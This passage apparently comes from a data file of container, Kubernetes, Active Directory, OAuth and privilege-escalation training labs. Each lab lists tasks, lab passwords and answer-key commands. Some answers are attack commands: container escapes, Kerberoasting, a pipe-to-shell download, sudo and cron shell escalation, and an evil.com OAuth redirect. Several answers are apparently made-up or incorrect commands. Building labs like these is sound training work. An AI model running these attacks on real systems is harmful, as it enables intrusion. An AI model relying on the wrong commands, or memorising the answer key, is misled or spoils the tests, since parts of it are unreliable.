      { title: "RBAC Configurer", description: "Configure ArgoCD RBAC", correctAnswer: "data.csv: p, role:developer, applications, get, myproject/*, allow", points: 200},
      { title: "SSO Integrator", description: "Enable SSO for ArgoCD", correctAnswer: "argocd account update-password --account admin", points: 150},
      { title: "Sync Window Creator", description: "Create sync window", correctAnswer: "argocd appset windows create --schedule '0 2 * * *' --duration 4h --kind allow", points: 200},
      { title: "Hook Validator", description: "Add validation hook", correctAnswer: "argocd app add-hook myapp pre-sync --kind Job --exec-container validator", points: 200},
      { title: "Sig Verifier", description: "Verify Git repo signature", correctAnswer: "argocd repo add --gpg-key-pattern '*.gpg'", points: 200}
    ],
  },
  {
    title: "Supply Chain Security (SLSA & In-Toto)",
    description: "Implement supply chain security using SLSA framework and in-toto attestation.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Create and verify in-toto layouts, generate SLSA provenance, and enforce supply chain integrity.

### Environment
- Ubuntu 22.04 with in-toto, SLSA tools
- GitHub Actions for provenance generation
- Credentials: supply-admin / supply-sec-2024!

### Tasks
1. Create an in-toto layout defining the software supply chain
2. Generate SLSA Level 3 provenance for a build
3. Verify artifact integrity using in-toto verify
4. Implement SLSA provenance for container images
5. Create a link metadata file for build step attestation
6. Verify SLSA provenance meets organizational requirements
7. Integrate supply chain verification into deployment pipeline
8. Audit supply chain for tampering indicators

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create an in-toto layout defining the software supply chain", "Generate SLSA Level 3 provenance for a build", "Verify artifact integrity using in-toto verify", "Implement SLSA provenance for container images", "Create a link metadata file for build step attestation", "Verify SLSA provenance meets organizational requirements", "Integrate supply chain verification into deployment pipeline", "Audit supply chain for tampering indicators"],
    credentials: [
      { service: "container", username: "supply-admin", password: "supply-sec-2024!"}
    ],
    flags: [
      { title: "Layout Creator", description: "Create in-toto layout", correctAnswer: "in-toto-run --step-name build -- SLSA-provenance-gen", points: 200},
      { title: "Provenance Generator", description: "Generate SLSA provenance", correctAnswer: "slsa-github-generator provenance --subject myimage:latest", points: 200},
      { title: "Verifier", description: "Verify in-toto metadata", correctAnswer: "in-toto-verify --layout layout.root.layout --layout-key key.pub", points: 200},
      { title: "SLSA Verifier", description: "Verify SLSA provenance", correctAnswer: "slsa-verifier verify-image myimage:latest --provenance-path provenance.json", points: 200},
      { title: "Link Creator", description: "Create link metadata", correctAnswer: "in-toto-run --step-name test -- pytest tests/", points: 200}
    ],
  },
  {
    title: "DevSecOps Pipeline with Automated Compliance",
    description: "Build a complete DevSecOps pipeline with automated compliance checks and reporting.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Integrate SAST, DAST, SCA, and compliance scanning into a unified DevSecOps workflow.

### Environment
- Ubuntu 22.04 with SonarQube, OWASP ZAP
- Jenkins or GitHub Actions
- Credentials: devsecops / devsec-2024!

### Tasks
1. Set up SAST scanning with SonarQube for code quality and security
2. Integrate DAST scanning with OWASP ZAP in CI/CD
3. Configure SCA (Software Composition Analysis) for dependency vulnerabilities
4. Implement container image scanning as a pipeline stage
5. Add license compliance checking for open source dependencies
6. Create security gates that block deployments on critical findings
7. Generate unified security reports across all scan types
8. Implement security metrics dashboards for development teams

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Set up SAST scanning with SonarQube for code quality and security", "Integrate DAST scanning with OWASP ZAP in CI/CD", "Configure SCA (Software Composition Analysis) for dependency vulnerabilities", "Implement container image scanning as a pipeline stage", "Add license compliance checking for open source dependencies", "Create security gates that block deployments on critical findings", "Generate unified security reports across all scan types", "Implement security metrics dashboards for development teams"],
    credentials: [
      { service: "container", username: "devsecops", password: "devsec-2024!"}
    ],
    flags: [
      { title: "SAST Scanner", description: "Run SonarQube SAST scan", correctAnswer: "sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=src/", points: 150},
      { title: "DAST Scanner", description: "Run OWASP ZAP scan", correctAnswer: "zap-full-scan.py -t https://target.example.com -r report.html", points: 200},
      { title: "SCA Analyzer", description: "Analyze dependencies", correctAnswer: "snyk test --all-projects --severity-threshold=high", points: 150},
      { title: "Gate Enforcer", description: "Block deployment on critical", correctAnswer: "if [ $(sonar-qube-quality-gate-check) != 'PASSED' ]; then exit 1; fi", points: 200},
      { title: "Report Generator", description: "Generate unified report", correctAnswer: "merge-reports --sast sonar.json --dast zap.json --sca snyk.json", points: 200}
    ],
  },
{
    title: "Docker Security Hardening",
    description: "Harden Docker containers and daemons against common attack vectors.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Implement Docker Bench for Security recommendations and minimize container attack surface.

### Environment
- Ubuntu 22.04 with Docker CE
- Docker Bench for Security
- Credentials: root / docker-harden-2024!

### Tasks
1. Run Docker Bench for Security and analyze findings
2. Implement non-root user execution in Dockerfiles
3. Remove unnecessary capabilities from running containers
4. Configure read-only root filesystems for containers
5. Set resource limits (CPU, memory) for all containers
6. Enable Docker content trust for image verification
7. Implement container logging and monitoring
8. Harden Docker daemon configuration (daemon.json)

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Run Docker Bench for Security and analyze findings", "Implement non-root user execution in Dockerfiles", "Remove unnecessary capabilities from running containers", "Configure read-only root filesystems for containers", "Set resource limits (CPU, memory) for all containers", "Enable Docker content trust for image verification", "Implement container logging and monitoring", "Harden Docker daemon configuration (daemon.json)"],
    credentials: [
      { service: "container", username: "root", password: "docker-harden-2024!"}
    ],
    flags: [
      { title: "Bench Runner", description: "Run Docker Bench", correctAnswer: "docker run --net host --pid host docker/docker-bench-security", points: 150},
      { title: "User Hardener", description: "Add non-root user to Dockerfile", correctAnswer: "RUN addgroup -S appgroup && adduser -S appuser -G appgroup USER appuser", points: 150},
      { title: "Cap Dropper", description: "Drop all capabilities", correctAnswer: "docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx", points: 200},
      { title: "ReadOnly FS", description: "Enable read-only filesystem", correctAnswer: "docker run --read-only --tmpfs /tmp nginx", points: 200},
      { title: "Resource Limiter", description: "Set resource limits", correctAnswer: "docker run --memory=512m --cpus=1.0 nginx", points: 150}
    ],
  },
  {
    title: "Kubernetes Pod Security & Admission Control",
    description: "Implement Pod Security Standards and admission controllers in Kubernetes.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Configure Pod Security Admission, OPA Gatekeeper, and Kyverno for policy enforcement.

### Environment
- Ubuntu 22.04 with kind cluster
- kubectl, helm
- Credentials: k8s-admin / pod-sec-2024!

### Tasks
1. Configure Pod Security Admission (PSA) for namespaces
2. Deploy OPA Gatekeeper with constraint templates
3. Create custom Gatekeeper policies for image registry restrictions
4. Implement Kyverno policies for pod security requirements
5. Block privileged containers and host network access
6. Enforce resource quotas and limits on all namespaces
7. Configure runtime class for security-sensitive workloads
8. Test policy enforcement with intentionally violating pods

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure Pod Security Admission (PSA) for namespaces", "Deploy OPA Gatekeeper with constraint templates", "Create custom Gatekeeper policies for image registry restrictions", "Implement Kyverno policies for pod security requirements", "Block privileged containers and host network access", "Enforce resource quotas and limits on all namespaces", "Configure runtime class for security-sensitive workloads", "Test policy enforcement with intentionally violating pods"],
    credentials: [
      { service: "container", username: "k8s-admin", password: "pod-sec-2024!"}
    ],
    flags: [
      { title: "PSA Configurer", description: "Configure Pod Security Admission", correctAnswer: "kubectl label namespace default pod-security.kubernetes.io/enforce=restricted", points: 150},
      { title: "Gatekeeper Deployer", description: "Deploy OPA Gatekeeper", correctAnswer: "helm install gatekeeper gatekeeper/gatekeeper --namespace gatekeeper-system", points: 150},
      { title: "Constraint Creator", description: "Create constraint template", correctAnswer: "kubectl apply -f constraint-template.yaml", points: 200},
      { title: "Kyverno Installer", description: "Install Kyverno", correctAnswer: "helm install kyverno kyverno/kyverno --namespace kyverno", points: 150},
      { title: "Policy Tester", description: "Test with violating pod", correctAnswer: "kubectl run test --image=nginx --privileged=true --dry-run=server", points: 200}
    ],
  },
  {
    title: "Container Escape & Runtime Exploitation",
    description: "Understand and test container escape techniques to improve defenses.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify container escape vectors and implement defenses against privilege escalation.

### Environment
- Ubuntu 22.04 with vulnerable Docker configurations
- Container escape testing tools
- Credentials: root / escape-test-2024!

### Tasks
1. Test container escape via privileged container capabilities
2. Exploit misconfigured Docker socket mount for host access
3. Test kernel exploit-based escape (DirtyPipe, DirtyCow)
4. Exploit /proc/sys/kernel namespace configuration
5. Test cgroup release_agent escape technique
6. Identify and exploit vulnerable container runtime configurations
7. Implement seccomp profiles to prevent syscall-based escapes
8. Deploy AppArmor profiles for container confinement

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Test container escape via privileged container capabilities", "Exploit misconfigured Docker socket mount for host access", "Test kernel exploit-based escape (DirtyPipe, DirtyCow)", "Exploit /proc/sys/kernel namespace configuration", "Test cgroup release_agent escape technique", "Identify and exploit vulnerable container runtime configurations", "Implement seccomp profiles to prevent syscall-based escapes", "Deploy AppArmor profiles for container confinement"],
    credentials: [
      { service: "container", username: "root", password: "escape-test-2024!"}
    ],
    flags: [
      { title: "Privileged Escaper", description: "Escape via privileged mode", correctAnswer: "mount /dev/sda1 /mnt && chroot /mnt", points: 250},
      { title: "Socket Exploiter", description: "Exploit Docker socket mount", correctAnswer: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json", points: 250},
      { title: "Cgroup Escaper", description: "Escape via cgroup release_agent", correctAnswer: "echo 1 > /proc/sys/kernel/cgroup_release_agent", points: 300},
      { title: "Seccomp Defenser", description: "Apply restrictive seccomp profile", correctAnswer: "docker run --security-opt seccomp=strict-profile.json nginx", points: 200},
      { title: "AppArmor Enforcer", description: "Apply AppArmor profile", correctAnswer: "docker run --security-opt apparmor=docker-strict nginx", points: 200}
    ],
  },
  {
    title: "Image Vulnerability Scanning & Compliance",
    description: "Implement comprehensive container image vulnerability scanning and compliance checking.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Scan images with multiple tools, implement base image pinning, and enforce image policies.

### Environment
- Ubuntu 22.04 with Trivy, Grype, and Clair
- Harbor registry with scanning
- Credentials: scan-admin / imgscan-sec-2024!

### Tasks
1. Scan images with Trivy for CVEs and misconfigurations
2. Compare scan results between Trivy and Grype
3. Implement base image digest pinning in Dockerfiles
4. Configure Harbor with automatic vulnerability scanning
5. Create image signing policies using Notary/Cosign
6. Implement image promotion workflow based on scan results
7. Scan Dockerfile for best practice violations with Hadolint
8. Generate compliance reports for container images

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan images with Trivy for CVEs and misconfigurations", "Compare scan results between Trivy and Grype", "Implement base image digest pinning in Dockerfiles", "Configure Harbor with automatic vulnerability scanning", "Create image signing policies using Notary/Cosign", "Implement image promotion workflow based on scan results", "Scan Dockerfile for best practice violations with Hadolint", "Generate compliance reports for container images"],
    credentials: [
      { service: "container", username: "scan-admin", password: "imgscan-sec-2024!"}
    ],
    flags: [
      { title: "Trivy Scanner", description: "Scan image with Trivy", correctAnswer: "trivy image --severity HIGH,CRITICAL --format json myimage:latest", points: 150},
      { title: "Grype Comparator", description: "Scan with Grype", correctAnswer: "grype docker:myimage:latest -o json", points: 150},
      { title: "Digest Pinner", description: "Pin base image by digest", correctAnswer: "FROM ubuntu:22.04@sha256:abc123...", points: 100},
      { title: "Hadolint Runner", description: "Lint Dockerfile", correctAnswer: "hadolint Dockerfile --format json", points: 150},
      { title: "Harbor Configurer", description: "Configure Harbor scanning", correctAnswer: "curl -X PUT https://harbor/api/v2.0/projects/myproject -d '{auto_scan:true}'", points: 200}
    ],
  },
  {
    title: "Helm Chart Security & Template Hardening",
    description: "Secure Helm charts by hardening templates, RBAC, and network policies.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Audit Helm charts for security issues, implement best practices, and validate with policy engines.

### Environment
- Ubuntu 22.04 with Helm 3
- Chart testing tools (ct, conftest)
- Credentials: helm-admin / helm-sec-2024!

### Tasks
1. Audit Helm chart templates for security misconfigurations
2. Implement non-root security contexts in templates
3. Add network policies to chart templates
4. Configure RBAC for Helm release management
5. Use Conftest to validate charts with OPA Rego policies
6. Implement values.yaml hardening with security defaults
7. Test chart security with chart-testing (ct) framework
8. Sign Helm charts for provenance verification

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Audit Helm chart templates for security misconfigurations", "Implement non-root security contexts in templates", "Add network policies to chart templates", "Configure RBAC for Helm release management", "Use Conftest to validate charts with OPA Rego policies", "Implement values.yaml hardening with security defaults", "Test chart security with chart-testing (ct) framework", "Sign Helm charts for provenance verification"],
    credentials: [
      { service: "container", username: "helm-admin", password: "helm-sec-2024!"}
    ],
    flags: [
      { title: "Chart Auditor", description: "Audit chart for issues", correctAnswer: "helm lint mychart/ --strict", points: 150},
      { title: "Security Context Adder", description: "Add security context to template", correctAnswer: "securityContext: runAsNonRoot: true runAsUser: 1000 readOnlyRootFilesystem: true", points: 200},
      { title: "Policy Validator", description: "Validate with Conftest", correctAnswer: "conftest test mychart/templates/ -p policy/", points: 200},
      { title: "RBAC Configurer", description: "Add RBAC to chart", correctAnswer: "helm install myrelease ./mychart --set rbac.create=true", points: 200},
      { title: "Chart Signer", description: "Sign Helm chart", correctAnswer: "helm signer sign mychart/ --key cosign.key", points: 200}
    ],
  },
  {
    title: "Service Mesh Security (Istio/Linkerd)",
    description: "Implement service mesh security features for mTLS, authorization, and observability.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1150,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Deploy Istio service mesh with strict mTLS, authorization policies, and traffic encryption.

### Environment
- Ubuntu 22.04 with Istio
- Kubernetes cluster for mesh deployment
- Credentials: mesh-admin / mesh-sec-2024!

### Tasks
1. Install Istio with security profile on Kubernetes cluster
2. Configure strict mTLS for all service-to-service communication
3. Create authorization policies for service-level access control
4. Implement JWT authentication for ingress gateways
5. Configure request authentication and JWT validation
6. Set up peer authentication for namespace-level mTLS
7. Monitor Istio security telemetry with Kiali
8. Test that unauthenticated traffic is rejected

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install Istio with security profile on Kubernetes cluster", "Configure strict mTLS for all service-to-service communication", "Create authorization policies for service-level access control", "Implement JWT authentication for ingress gateways", "Configure request authentication and JWT validation", "Set up peer authentication for namespace-level mTLS", "Monitor Istio security telemetry with Kiali", "Test that unauthenticated traffic is rejected"],
    credentials: [
      { service: "container", username: "mesh-admin", password: "mesh-sec-2024!"}
    ],
    flags: [
      { title: "Istio Installer", description: "Install Istio with security profile", correctAnswer: "istioctl install --set profile=default", points: 150},
      { title: "mTLS Enforcer", description: "Enable strict mTLS", correctAnswer: "kubectl apply -f peer-auth.yaml", points: 200},
      { title: "Auth Policy Creator", description: "Create authorization policy", correctAnswer: "kubectl apply -f authorization-policy.yaml", points: 200},
      { title: "JWT Configurer", description: "Configure JWT authentication", correctAnswer: "istioctl install --set values.global.jwtRules[0].issuer=https://auth.example.com", points: 200},
      { title: "Traffic Monitor", description: "Monitor security telemetry", correctAnswer: "kubectl port-forward svc/kiali -n istio-system 20001:20001", points: 150}
    ],
  },
  {
    title: "Runtime Protection with Sysdig/Falco",
    description: "Deploy runtime security monitoring to detect and respond to container threats.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Implement runtime threat detection, behavioral analysis, and automated response for containers.

### Environment
- Ubuntu 22.04 with Sysdig/Falco
- Docker runtime for testing
- Credentials: runtime-admin / runtime-sec-2024!

### Tasks
1. Deploy Falco with custom rules for container runtime monitoring
2. Detect unauthorized process execution in containers
3. Monitor for file system tampering in running containers
4. Alert on unexpected network connections from containers
5. Implement automated response to stop compromised containers
6. Create behavioral baselines for normal container activity
7. Integrate runtime alerts with SIEM for correlation
8. Tune detection rules to minimize false positives

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Deploy Falco with custom rules for container runtime monitoring", "Detect unauthorized process execution in containers", "Monitor for file system tampering in running containers", "Alert on unexpected network connections from containers", "Implement automated response to stop compromised containers", "Create behavioral baselines for normal container activity", "Integrate runtime alerts with SIEM for correlation", "Tune detection rules to minimize false positives"],
    credentials: [
      { service: "container", username: "runtime-admin", password: "runtime-sec-2024!"}
    ],
    flags: [
      { title: "Falco Deployer", description: "Deploy Falco with custom rules", correctAnswer: "helm install falco falcosecurity/falco --set falcosidekick.enabled=true", points: 150},
      { title: "Process Monitor", description: "Detect unauthorized processes", correctAnswer: "falco -r /etc/falco/rules.d/custom-rules.yaml -o json", points: 200},
      { title: "File Watcher", description: "Monitor file tampering", correctAnswer: "- rule: File Tampering condition: modify_file and container", points: 200},
      { title: "Auto Responder", description: "Auto-stop compromised container", correctAnswer: "docker stop $(docker inspect --format='{{.Id}}' $CONTAINER_ID)", points: 250},
      { title: "SIEM Integrator", description: "Send alerts to SIEM", correctAnswer: "falcosidekick --elasticsearch.hostport=http://elasticsearch:9200/falco-*", points: 200}
    ],
  },
  {
    title: "Kubernetes Network Security & Service Mesh Policies",
    description: "Implement network segmentation and zero-trust networking in Kubernetes.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Deploy Calico/Cilium for network policies, implement micro-segmentation, and enforce zero-trust.

### Environment
- Ubuntu 22.04 with Cilium
- Kubernetes cluster for policy testing
- Credentials: net-admin / k8snet-sec-2024!

### Tasks
1. Deploy Cilium CNI with network policy enforcement
2. Create default deny-all NetworkPolicy for all namespaces
3. Implement L7 HTTP policies for fine-grained access control
4. Configure DNS-based network policies for external access
5. Implement encryption with WireGuard for pod-to-pod traffic
6. Set up Hubble for network observability and flow visualization
7. Create namespace isolation policies for multi-tenancy
8. Test policy enforcement with intentional violations

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Deploy Cilium CNI with network policy enforcement", "Create default deny-all NetworkPolicy for all namespaces", "Implement L7 HTTP policies for fine-grained access control", "Configure DNS-based network policies for external access", "Implement encryption with WireGuard for pod-to-pod traffic", "Set up Hubble for network observability and flow visualization", "Create namespace isolation policies for multi-tenancy", "Test policy enforcement with intentional violations"],
    credentials: [
      { service: "container", username: "net-admin", password: "k8snet-sec-2024!"}
    ],
    flags: [
      { title: "Cilium Deployer", description: "Deploy Cilium CNI", correctAnswer: "helm install cilium cilium/cilium --set encryption.enabled=true", points: 150},
      { title: "Deny-All Creator", description: "Create deny-all NetworkPolicy", correctAnswer: "kubectl apply -f deny-all-networkpolicy.yaml", points: 200},
      { title: "L7 Policy Creator", description: "Create L7 HTTP policy", correctAnswer: "kubectl apply -f cilium-l7-policy.yaml", points: 250},
      { title: "WireGuard Enabler", description: "Enable pod-to-pod encryption", correctAnswer: "cilium encrypt enable --type wireguard", points: 200},
      { title: "Hubble Monitor", description: "Deploy Hubble for observability", correctAnswer: "cilium hubble enable --ui", points: 150}
    ],
  },
  {
    title: "Active Directory Security Assessment",
    description: "Assess and harden Active Directory environments against common attack paths.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Enumerate AD misconfigurations, exploit Kerberos weaknesses, and implement hardening measures.

### Environment
- Ubuntu 22.04 with Impacket tools
- BloodHound, Rubeus
- Credentials: ad-test / ad-sec-2024!

### Tasks
1. Enumerate AD users, groups, and computers using LDAP
2. Map AD attack paths with BloodHound collection
3. Exploit Kerberoasting to extract service account hashes
4. Perform AS-REP roasting on accounts with pre-auth disabled
5. Identify unconstrained delegation misconfigurations
6. Abuse GPO permissions for privilege escalation
7. Implement LAPS for local admin password management
8. Deploy tiered administration model for AD protection

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate AD users, groups, and computers using LDAP", "Map AD attack paths with BloodHound collection", "Exploit Kerberoasting to extract service account hashes", "Perform AS-REP roasting on accounts with pre-auth disabled", "Identify unconstrained delegation misconfigurations", "Abuse GPO permissions for privilege escalation", "Implement LAPS for local admin password management", "Deploy tiered administration model for AD protection"],
    credentials: [
      { service: "container", username: "ad-test", password: "ad-sec-2024!"}
    ],
    flags: [
      { title: "LDAP Enumerator", description: "Enumerate AD via LDAP", correctAnswer: "ldapsearch -x -H ldap://dc01 -b DC=lab,DC=local '(objectClass=user)' sAMAccountName", points: 150},
      { title: "BloodHound Collector", description: "Collect AD data for BloodHound", correctAnswer: "bloodhound-python -u ad-test -p 'ad-sec-2024!' -d lab.local -dc dc01.lab.local -c all", points: 200},
      { title: "Kerberoaster", description: "Perform Kerberoasting attack", correctAnswer: "impacket-GetUserSPNs lab.local/ad-test:ad-sec-2024! -dc-ip dc01 -request", points: 250},
      { title: "ASREPRoaster", description: "Exploit AS-REP roasting", correctAnswer: "impacket-GetNPUsers lab.local/ -usersfile users.txt -format hashcat", points: 200},
      { title: "GPAbuser", description: "Abuse GPO permissions", correctAnswer: "bloodhound-python -c GpLocalGroup -u ad-test -p 'ad-sec-2024!' -d lab.local", points: 200}
    ],
  },
  {
    title: "OAuth 2.0 & OIDC Security Testing",
    description: "Test OAuth 2.0 and OpenID Connect implementations for security vulnerabilities.",
    dockerImage: "node:20-alpine",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Exploit OAuth misconfigurations including redirect URI manipulation and token leakage.

### Environment
- Node.js OAuth 2.0 server
- Burp Suite for token interception
- Credentials: oauth-test / oauth-sec-2024!

### Tasks
1. Exploit open redirect in OAuth callback URL
2. Perform authorization code theft via referrer header leakage
3. Bypass PKCE protection through code replay attacks
4. Test for token injection in OAuth implicit flow
5. Exploit weak state parameter validation
6. Perform CSRF attacks on OAuth authorization endpoints
7. Test JWT token validation and key rotation
8. Implement proper OAuth security controls

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Exploit open redirect in OAuth callback URL", "Perform authorization code theft via referrer header leakage", "Bypass PKCE protection through code replay attacks", "Test for token injection in OAuth implicit flow", "Exploit weak state parameter validation", "Perform CSRF attacks on OAuth authorization endpoints", "Test JWT token validation and key rotation", "Implement proper OAuth security controls"],
    credentials: [
      { service: "container", username: "oauth-test", password: "oauth-sec-2024!"}
    ],
    flags: [
      { title: "Redirect Exploiter", description: "Exploit open redirect in OAuth", correctAnswer: "redirect_uri=https://legit.com/callback@evil.com", points: 200},
      { title: "Code Thief", description: "Steal authorization code", correctAnswer: "Intercept redirect with code parameter and replay", points: 250},
      { title: "PKCE Bypasser", description: "Bypass PKCE protection", correctAnswer: "Replay authorization code with different code_verifier", points: 250},
      { title: "CSRF Attacker", description: "CSRF on authorization endpoint", correctAnswer: "Forge authorization request without state parameter", points: 200},
      { title: "Token Forger", description: "Forge JWT claims", correctAnswer: "Modify JWT header to use none algorithm", points: 250}
    ],
  },
  {
    title: "Privilege Escalation on Linux & Windows",
    description: "Identify and exploit privilege escalation vectors on Linux and Windows systems.",
    dockerImage: "parrotsec/security",
    difficulty: 1000,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Use automated enumeration tools and manual techniques to escalate from low-privileged to admin.

### Environment
- Parrot Security OS with linPEAS/winPEAS
- Privilege escalation tools
- Credentials: user / privesc-2024!

### Tasks
1. Run linPEAS to enumerate Linux privilege escalation vectors
2. Exploit SUID binaries for local privilege escalation
3. Abuse sudo misconfigurations (sudo -l analysis)
4. Find and exploit writable cron jobs for escalation
5. Exploit kernel vulnerabilities for unprivileged root access
6. Use GTFOBins to abuse legitimate binaries for escalation
7. Document all escalation paths and remediation steps
8. Implement defenses against common escalation techniques

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Run linPEAS to enumerate Linux privilege escalation vectors", "Exploit SUID binaries for local privilege escalation", "Abuse sudo misconfigurations (sudo -l analysis)", "Find and exploit writable cron jobs for escalation", "Exploit kernel vulnerabilities for unprivileged root access", "Use GTFOBins to abuse legitimate binaries for escalation", "Document all escalation paths and remediation steps", "Implement defenses against common escalation techniques"],
    credentials: [
      { service: "ssh", username: "user", password: "privesc-2024!"}
    ],
    flags: [
      { title: "LinPEAS Runner", description: "Run linPEAS enumeration", correctAnswer: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", points: 150},
      { title: "SUID Exploiter", description: "Exploit SUID binary", correctAnswer: "find / -perm -4000 -type f 2>/dev/null", points: 200},
      { title: "Sudo Abuser", description: "Abuse sudo misconfiguration", correctAnswer: "sudo -l && sudo /usr/bin/vim -c ':!sh'", points: 200},
      { title: "Cron Exploiter", description: "Exploit writable cron job", correctAnswer: "echo 'chmod +s /bin/bash' >> /opt/cron.sh", points: 250},
      { title: "GTFOBins User", description: "Use GTFOBins for escalation", correctAnswer: "sudo find . -exec /bin/sh \\; -quit", points: 200}
    ],
  },
  {
    title: "Certificate-Based Authentication (mTLS)",
    description: "Implement mutual TLS authentication for services and users.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Set up certificate authority, issue client certificates, and configure mTLS for applications.

### Environment
- Ubuntu 22.04 with OpenSSL
- Nginx for mTLS configuration
- Credentials: pki-admin / mtls-sec-2024!

### Tasks
1. Create an internal Certificate Authority (CA)
2. Generate server and client certificate key pairs
3. Configure Nginx to require client certificates (mTLS)
4. Implement certificate revocation with CRL and OCSP
5. Set up automatic certificate issuance with CFSSL
6. Configure mTLS for inter-service communication
7. Monitor certificate expiry and implement renewal automation
8. Test mTLS enforcement with curl and openssl

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create an internal Certificate Authority (CA)", "Generate server and client certificate key pairs", "Configure Nginx to require client certificates (mTLS)", "Implement certificate revocation with CRL and OCSP", "Set up automatic certificate issuance with CFSSL", "Configure mTLS for inter-service communication", "Monitor certificate expiry and implement renewal automation", "Test mTLS enforcement with curl and openssl"],
    credentials: [
      { service: "container", username: "pki-admin", password: "mtls-sec-2024!"}
    ],
    flags: [
      { title: "CA Creator", description: "Create internal CA", correctAnswer: "openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -nodes", points: 150},
      { title: "Cert Issuer", description: "Issue client certificate", correctAnswer: "openssl req -new -newkey rsa:2048 -keyout client.key -out client.csr", points: 200},
      { title: "mTLS Configurer", description: "Configure Nginx mTLS", correctAnswer: "ssl_client_certificate /etc/ssl/ca.crt; ssl_verify_client on;", points: 200},
      { title: "CRL Manager", description: "Implement certificate revocation", correctAnswer: "openssl ca -revoke client.crt && openssl ca -gencrl -out crl.pem", points: 200},
      { title: "mTLS Tester", description: "Test mTLS connection", correctAnswer: "curl --cert client.crt --key client.key --cacert ca.crt https://server/", points: 150}
    ],
  },
  {
    title: "RBAC Design & Implementation",
    description: "Design and implement Role-Based Access Control across enterprise systems.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Create RBAC models, implement least-privilege roles, and audit access patterns.

### Environment
- Ubuntu 22.04 with various RBAC systems
- Access control testing tools
- Credentials: rbac-admin / rbac-sec-2024!

### Tasks
1. Design RBAC model with roles, permissions, and role hierarchy
2. Implement RBAC in an application using Spring Security or equivalent
3. Create role assignments following least-privilege principle
4. Audit existing roles for excessive permissions (role mining)
5. Implement attribute-based access control (ABAC) extensions to RBAC
6. Test RBAC enforcement across all application endpoints
7. Implement role request and approval workflow
8. Generate RBAC compliance report for audit

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
